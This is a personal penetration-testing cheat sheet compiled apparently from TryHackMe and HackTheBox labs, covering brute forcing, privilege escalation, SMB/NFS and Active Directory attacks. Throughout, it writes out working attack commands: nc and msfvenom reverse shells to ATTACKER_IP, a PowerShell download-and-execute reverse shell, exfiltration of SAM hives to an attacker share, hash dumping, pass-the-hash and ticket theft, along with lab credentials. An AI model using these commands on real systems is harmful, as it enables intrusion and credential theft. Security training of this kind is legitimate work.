
### Go specific stuff
	go specific CVEs
    OWASP
    sync
    input processing, large size, floating point
    set timeout
    size limiter = go io limiter
    input validation, negative value ?
    cuelang, synk

### Hydra specific
 - hydra -l lazie -P /mnt/c/D/SecLists-master/Passwords/Common-Credentials/common-passwords-win.txt 10.10.112.12 imap
 - sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.234.98 http-post-form "/login.php:username=admin&password=^PASS^&Submit=Login:Warning"


### FTP          
pentester@TryHackMe$ telnet MACHINE_IP 110
Trying MACHINE_IP...
Connected to MACHINE_IP.
Escape character is '^]'.
+OK MACHINE_IP Mail Server POP3 Wed, 15 Sep 2021 11:05:34 +0300 
USER frank
+OK frank
PASS D2xc9CgD
+OK 1 messages (179) octets
STAT
+OK 1 179
LIST
+OK 1 messages (179) octets
1 179
.
RETR 1
+OK
From: Mail Server 
To: Frank 
subject: Sending email with Telnet
Hello Frank,
I am just writing to say hi!
.
QUIT
+OK MACHINE_IP closing connection
Connection closed by foreign host.


### Metasploit
1. may need to migrate if hashdump does not work
2. not all are hashes ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:5ff44baab48ef90b6a2eccc1786d0dd9::: :5... is hash, use online crackstation?
3. search -f <filename> in meterpreter
4. command `background` to get out of session, and use post/... modules
5. Payload types, `Non staged` -> sends all shell code at once, large, wont always work (ex: linux/meterpreter_reverse_tcp), the `meterpreter_` in front
6. The other one is `staged`, sends payload in stages, less stable, `linux/meterpreter/reverse_tcp`, the `meterpreter/` in the beginnning.

### Linux Privilege Escalation
 - `sudo -l`
 - Use the following tools

    LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/
    
    LinEnum: https://github.com/rebootuser/LinEnum
    
    LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
    
    Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
    
    Linux Priv Checker: https://github.com/linted/linuxprivchecker 

- Use GTFO bin, look at how they can be used to escape. https://gtfobins.github.io/  
- if u have sudo permission to somethings
- also we can check if suid or sgid bit are set in gtfo bins
- find place with suid bit set find / -type f -perm -04000 -ls 2>/dev/null
- To crach password use the following command \john.exe  --wordlist=C:\D\SecLists-master\Passwords\Common-Credentials\10k-most-common.txt pass.txt
- .\john.exe pass.txt --show
- manipulating $PATH, if a code execute commands like this system("thm"), change path to point to your binary, the calling code must have setuid set to escalate privilige.
- network mound, if no_root_sqash present
`showmount -e victimsIP`
`mount -o rw ip:/victimdir local_dir/`
make file with suid bit set in local_dir
change owner to root
run in victims machine

 - Check for any cronjob, that we can manipulate
 - check its sudo permissions `sudo -l`
- get capabilites `getcap -r / 2>/dev/null`

### Windws priv sec
NOTE: Checkout winpeas
1. Saved passwords (Search for pwoershell history in `ConsoleHost_history.txt` at C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline )
#### when mass deployed
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
#### powershell history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
#### saved creds
cmdkey /list
runas /savecred /user:admin cmd.exe

#### saved IIS configuration
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

#### putty proxy configuration
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

#### scheduled tasks
 - `schtasks /query /tn vulntask /fo list /v`  this command trims down the output
 - just check the `Task To Run` and `Run As`
 - `icacls <binary_from_task_to_run>`
 - If you can modify binary, then you can run ur own code `echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat`
	
#### AlwaysInstallElevated
 - MSI files, if some registry keys have been set, can run with higher priviliges 
 - keys to check `C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
 - Generate the payload `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.247.41 LPORT=LOCAL_PORT -f msi -o malicious.msi`
 - Run the payload `C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`

#### Insecure Permissions on Service Executable
 - `sc qc <Service_name>`
 - `icacls <binary>`
 - Can u modify it?
 - msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
 - setup a python http server, in powershell download using wget
 - move the original service binary file, since the service binary will be run by another user, change permission  `icacls WService.exe /grant Everyone:F`
 - `sc stop <service>` `sc start <service>`
 - not any binary can be run as service, so be careful

#### Unquoted Service Paths
 - If task to run binary path is not properly quoted like `C:\MyPrograms\Disk Sorter Enterprise\bin`
 - sc will look for `C:\MyPrograms\Disk.exe` `C:\MyPrograms\Disk Sorter.exe` and `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` respectively
 - If u can create such files in the directories, like Disk.exe, u can modify which service is executed.

#### Insecure Service Permissions
 - not of binary, but of service itself
 - can use tool from https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
 - accesschk64.exe -qlc <service_name>
 - `icacls C:\Users\me\bin.exe /grant Everyone:F`
 - `sc config THMService binPath= "C:\Users\me\bin.exe" obj= LocalSystem`
 - sc stop and start again

#### Windows Privliges
 - to check your privilige `whoami /priv`
 - use methods from https://github.com/gtworek/Priv2Admin
 - tryhackme had `SeBackup / SeRestore` lab
```
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.


user@attackerpc$ mkdir share
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
   

C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\

        

And use impacket to retrieve the users' password hashes:
Kali Linux

user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```
#### Other stuffs
- search for installed programs and exploit any known vulnerabilities `wmic product get name,version,vendor` may also need to check desktop shortcut, services and other indicator of installed apps.
 - Additional tools to use `https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS` `https://github.com/itm4n/PrivescCheck` `https://github.com/bitsadmin/wesng` `metasploit multi/recon/local_exploit_suggester` 

### SAMBA
 - Interopratibility program for linux and unix to windows SMB
 - `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip>`
 - `smbclient //<ip>/anonymous`  // if anon supported
 - `smbget -R smb://<ip>/anonymous`  // recursively download everything
 - `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.244.32`  // recon network file share
 - If u find vulnerability in searchsploit, if not RCE, others thing we can do, like copy files? proftd had something similar, copy ssh key?
 - `mkdir /mnt/NFS` `mount victim_ip:/var /mnt/NFS` `ls -la /mnt/kenobiNFS1`

### Jenkins room
 - check default creds
 - search for functionality to execute commands (it was in build options)
 - privsec https://github.com/samratashok/nishang
 - powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
 - whoami /priv may give SeImpersonatePrivilege 
 - we can impersonate in meterpreter
 - `list_tokens -g`
 - `impersonate_token "BUILTIN\Administrators" `

### SMB
 - basically a request-response protocol over netbios on TCP/IP, unix has open source version that implements it SMB
 - used to share access to files, printers, serial ports and other stuffs
 - client sends request to server, and can send requests to server to perform stuff.
 - SMB share drives on a server that can be connected to and used to view or transfer files
 - enumeration, port scanning or enum4linux https://github.com/CiscoCXSecurity/enum4linux `enum4linux [options] ip`. 
 - port 445 by default, do nmap -sV
 - note down the username, workgroup and interesting share names
 - anonymous connect using `smbclient \\IP\share_name -u username`. try anon login without username
 - download file with `get <filename>`

## #NFS
 - Network File System
 - use `nfs-common` package
 - sudo mount -t nfs IP:share /tmp/mount/ -nolock
 - `showmount e IP` to list shares
 - root_squash, (in ur pc, download a bash form internet, set it suid, chmod +s ..., ssh into machine and then run the bash)

### SMTP
 - connect using telnet and VRFY, EXPN, and RCPT TO commands.
 - metasploit auxiliary smtp modules.
### MYSQL
 - username and password already required
 - mestasploit schema dump and hash dump
 
### Active Directory
 - Windows domain is a group of users and computers under the administration of a given business
 - Active Directory acts as a catalogue that holds the information of all of the "objects" that exist on your network.
 - Users and Machine
 - GPOs are distributed to the network via a network share called SYSVOL, 
 -  it might take up to 2 hours for computers to catch up. 
 - force update GRP sync in local computer `gpupdate /force`
 - authentication method kerberos and netNTML
 - kerberos preferred, send username and password to kerberos server, and it returns ticket granting ticket, lookup process online if confused.
 - netNTLM from tryhackme https://tryhackme.com/room/winadbasics  
`The client sends an authentication request to the server they want to access.
The server generates a random number and sends it as a challenge to the client. The client combines their NTLM password hash with the challenge (and other known data) to generate a response to the challenge and sends it back to the server for verification. The server forwards the challenge and the response to the Domain Controller for verification. The domain controller uses the challenge to recalculate the response and compares it to the original response sent by the client. If they both match, the client is authenticated; otherwise, access is denied. The authentication result is sent back to the server. The server forwards the authentication result to the client.`
 - nmap scan, use kerbrute to get usernames? ```./kerbrute_linux_386 userenum usernames.txt --dc domain_controller```
 - ./kerbrute_linux_amd64  userenum userlist.txt -d spookysec.local --dc 10.10.107.161
 - ASREPRoasting. ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. USe impacket tools ```python3.9 /opt/impacket/examples/GetNPUsers.py spookysec.local/svc-admin```. Might need to set dns config to map domain to IP. after the tool, u might get hash
 - Lookup hash in `https://hashcat.net/wiki/doku.php?id=example_hashes`
 - `hashcat -m 18200 -a 0 pass_hash.txt passwordlist.txt` pass_hash.txt must have the full, hashcat_wiki is a good resource
 - form there u can try different things
 - smbclient `smbclient -L \\\\10.10.107.161 -U spookysec.local/svc-admin`
 - `smbclient \\\\10.10.107.161\\backup -U spookysec.local/svc-admin` to connect to the shares.
 - From tryhackme notes :"Knowing this, we can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer" `python3.9 /opt/impacket/examples/secretsdump.py spookysec.local/backup@10.10.152.71`
 - Most of the replication related tasks are specified on the Directory Replication Service (DRS) Remote Protocol. The Microsoft API which implements such protocol is called DRSUAPI.
 - look at the format `Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::` uid:rid:lmhash:nthash
 - pass the hash attack using `evil-winrm -u backup -H 19741bde08e135f4b40f1ca9aab45538 -i spookysec.local`
 - another tool https://github.com/GhostPack/Rubeus, need to launch in windows, listens for any kerberos tickets being passed in network `Rubeus.exe harvest /interval:30`
 - Kerberoasting is a post-exploitation attack technique that attempts to crack the password of a service account within the Active Directory (AD). In such an attack, an adversary masquerading as an account user with a service principal name (SPN) requests a ticket, which contains an encrypted password, or Kerberos.
 -  BloodHound to find all Kerberoastable accounts,
 - With rubeus `Rubeus.exe kerberoast` and u can try to crack the hash `hashcat -m 13100 -a 0 hash.txt Pass.txt`.
 - with impacket `sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.128.123 -request` and crack the hash
 - AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.
 - NOTE from tryhackme `During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are`
 - For AS-REP roasting, using rubeus, need to add  Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User. Make hash type `Kerberos 5, etype 23, AS-REP`
  - `hashcat -m 18200 hash.txt Pass.txt`
  - Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided
  - using mimikatz dump the ticket `sekurlsa::tickets /export` and then use the ticket `kerberos::ptt <ticket>` <ticket> = ticket file path
  - Check if a system is part of domain `systeminfo | findstr Domain`
 - https://github.com/ThePacketBender/notes/blob/master/hashcat.examples.txt

### Machine notes
 - sshkeygen creeate persistence man, can you copy for another user in auhtorized_keys
 - linpeas for info
 - rootsquash ,copy bash as root, set suid bash in network share
 - run the bash from remote session
 - ` ssh paradox@10.10.35.239 -i paradox 2049:localhost:2049` port forwarding if local mounting is not allowed
 - `mount -t nfs localhost:/ nfs/` after mounting locally
 
### MSSQL writeup
 - From HTB starting point
 - nmap to get stuff
 - `smbclient \\\\10.10.107.161\\backup` to get data.
 - python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth.
 - once connected, can `xp_cmdshell` can execute commands, might need to enter the following to enable xp_cmdshell `EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;`
 - Make the victim download `https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------`
 -`xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.22/nc64.exe -outfile nc64.exe"` OR `xp_cmdshell "powershell -c Invoke-WebRequest -Uri \"http://10.10.14.22:80/nc64.exe \" -OutFile \"C:\Users\sql_svc\Downloads\n.exe\""`
 - Listen on ur machine and on victim `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.129.113.162 443"`
 - Windows ssh like access `python3 psexec.py administrator@10.129.113.162` impacket tool

### Blue team notes
 - yara <path to specific yara rule file> target
 - python loki.py -p .  (loki is an alternative)
 - python3 yarGen.py -m <path to file to generate signature for> --excludegood -o <destination to .yar signature> https://github.com/Neo23x0/yarGen
 - floss (to auto decode strings in malware and detect them) https://www.mandiant.com/resources/blog/automatically-extracting-obfuscated-strings https://github.com/mandiant/flare-floss/releases
 - ssdeep compare hashes between two files, and their similarity percentage using fuzzy hashes. A fuzzy hash is a Context Triggered Piecewise Hash (CTPH). This hash is calculated by dividing a file into pieces and calculating the hashes of the different pieces. https://ssdeep-project.github.io/ssdeep/index.html
 - capa does a little bit of triage automation https://github.com/mandiant/capa
 - pestudio some automated analysis in PE header
